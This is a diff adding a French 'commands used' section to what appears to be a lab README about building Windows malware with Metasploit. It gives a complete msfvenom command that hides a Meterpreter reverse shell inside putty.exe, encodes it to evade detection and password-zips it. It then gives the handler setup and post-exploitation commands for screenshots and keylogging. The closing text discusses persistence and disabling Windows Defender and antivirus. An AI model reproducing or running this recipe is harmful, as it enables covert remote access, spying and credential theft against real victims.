@@ -740,7 +740,25 @@ https://github.com/user-attachments/assets/66c3f45b-dbcd-41a9-be69-3c94079fe26e
 
 
 
+## Commandes utilisées :
 
+````bash
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.178 LPORT=5555 -x /root/putty.exe -k -e x64/xor_dynamic -i 10 -f exe -o /home/kali/Desktop/payload_stable.exe
+zip -e -P 1234 /home/kali/Desktop/payload_stable.zip /home/kali/Desktop/payload_stable.exe
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_tcp
+set LHOST 192.168.1.178
+set LPORT 5555
+set ExitOnSession false
+exploit -j
+sessions
+sessions -i 1
+screenshot
+keyscan_start
+keyscan_dump
+sysinfo
+````
 
 
 **Conclusion :** Les commandes `screenshot`, `keyscan` et `hashdump` fonctionnent **uniquement sous Windows**. Sous Linux, Android ou macOS, certaines commandes sont indisponibles.esnuite il reste des commande importante comme la geoloc sur les pc mais impossible sur les vm ensuite persiste ce module incoyable qui va faire en sorte que meme au redemmarrage le malwar reste ou meme se fondre dans les fichier systeme ou un desactivement de window defender et des anti virus le probleme est qu avec les malwar actuelle que nous faisont ils ne marche que sur des vm et les vm au redemmarrage reinitialise toutes les commande window defender alors impossible de desactiver et pour la localisation et bien votre vm n as pas acces a votre carte reseau donc sert a rien .
